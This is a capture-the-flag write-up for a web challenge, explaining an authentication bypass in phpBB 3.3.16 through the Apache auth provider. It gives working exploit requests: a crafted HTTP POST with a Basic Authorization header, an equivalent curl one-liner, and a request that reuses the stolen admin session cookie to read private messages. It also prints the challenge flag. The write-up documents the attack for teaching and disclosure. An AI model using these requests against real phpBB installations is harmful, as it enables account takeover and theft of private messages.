# CTF Writeup — php is my passion

## Challenge Info

| Field       | Value                                                              |
|-------------|--------------------------------------------------------------------|
| Category    | Web                                                                |
| Challenge   | php-is-my-passion                                                  |
| Instance    | https://php-is-my-passion-1b34ae1c310d.chall.nnsc.tf               |
| Flag        | `NNS{php_15_MY_Pa55i0N_and_so_are_aP4CHe_au7h_pR0v1deR5}`         |

---

## Reconnaissance

The archive contained the following source files:

```
web_php-is-my-passion/
├── Dockerfile
├── compose.yml
├── entrypoint.sh
├── install-config.yml
└── seed.php
```

### Dockerfile — key detail

```dockerfile
curl -fsSL -o /tmp/phpbb.zip \
  https://download.phpbb.com/pub/release/3.3/3.3.16/phpBB-3.3.16.zip
```

The server runs **phpBB 3.3.16**, the last vulnerable version before the patch.

### seed.php — where the flag lives

```php
$flag = trim(file_get_contents('/flag.txt'));
$stmt = $db->prepare(
  'INSERT INTO phpbb_privmsgs ... VALUES (2, :t, :s, :m, :a)'
);
$stmt->bindValue(':m', $flag);   // flag stored as the message body
```

On every container start the flag is inserted as a **private message** sent to `user_id=2` (the admin account), with subject `note to self`. To read it we need an authenticated session as admin.

---

## Vulnerability — CVE-2026-48611

**Authentication bypass** in phpBB ≤ 3.3.16 (default `auth_method=db`).  
CVSS v3.1: **9.4 Critical** | Fixed in phpBB 3.3.17 (June 6 2026).  
Discovered by Dan Stefan Alexandru / Pentest-Tools.com.

### Root cause

`ucp.php?mode=login_link` accepts an `auth_provider` GET parameter.  
Passing `auth_provider=apache` routes authentication through the **Apache auth provider** instead of the configured one.

The Apache provider's `login()` checks two things:
1. `PHP_AUTH_USER` matches the submitted username.
2. `PHP_AUTH_PW` is **non-empty** — it never compares it against the stored hash.

Because every PHP SAPI populates `PHP_AUTH_USER` / `PHP_AUTH_PW` from any incoming `Authorization: Basic` header, a single unauthenticated request is enough to obtain a valid session as **any** active user.

---

## Exploit

### Step 1 — Bypass auth and get an admin session

```http
POST /ucp.php?mode=login_link&auth_provider=apache&login_link_x=1 HTTP/1.1
Host: php-is-my-passion-1b34ae1c310d.chall.nnsc.tf
Authorization: Basic YWRtaW46d3JvbmdwYXNzd29yZA==
Content-Type: application/x-www-form-urlencoded

login_username=admin&login_password=x&login=Login
```

`YWRtaW46d3JvbmdwYXNzd29yZA==` decodes to `admin:wrongpassword` — the password value is irrelevant as long as it is non-empty.

The server responds with **HTTP 302** and sets session cookies for `user_id=2` (admin):

```
Set-Cookie: phpbb3_7kc8r_u=2; ...
Set-Cookie: phpbb3_7kc8r_sid=8d28ee7844e7912def4c174d586e28eb; ...
```

Equivalent curl one-liner:

```bash
curl -sS -c cookies.txt \
  -u admin:wrongpassword \
  -d 'login_username=admin&login_password=x&login=Login' \
  'https://php-is-my-passion-1b34ae1c310d.chall.nnsc.tf/ucp.php?mode=login_link&auth_provider=apache&login_link_x=1'
```

### Step 2 — Read the private message containing the flag

```http
GET /ucp.php?i=pm&mode=view&f=0&p=1&sid=8d28ee7844e7912def4c174d586e28eb HTTP/1.1
Host: php-is-my-passion-1b34ae1c310d.chall.nnsc.tf
Cookie: phpbb3_7kc8r_u=2; phpbb3_7kc8r_k=; phpbb3_7kc8r_sid=8d28ee7844e7912def4c174d586e28eb
```

The response body contains the PM "note to self" whose message text is the flag.

---

## Flag

```
NNS{php_15_MY_Pa55i0N_and_so_are_aP4CHe_au7h_pR0v1deR5}
```

---

## Summary

| Step | Action |
|------|--------|
| 1 | Identified phpBB 3.3.16 from `Dockerfile` |
| 2 | Found flag stored in admin's private messages via `seed.php` |
| 3 | Exploited CVE-2026-48611 auth bypass with a single POST request |
| 4 | Used the stolen session cookie to read the private message inbox |
| 5 | Retrieved flag from the message body |

## References

- [CVE-2026-48611 — Pentest-Tools.com](https://pentest-tools.com/research/phpbb-authentication-bypass)
- [phpBB 3.3.17 release / patch](https://www.phpbb.com/community/viewtopic.php?t=2654725)
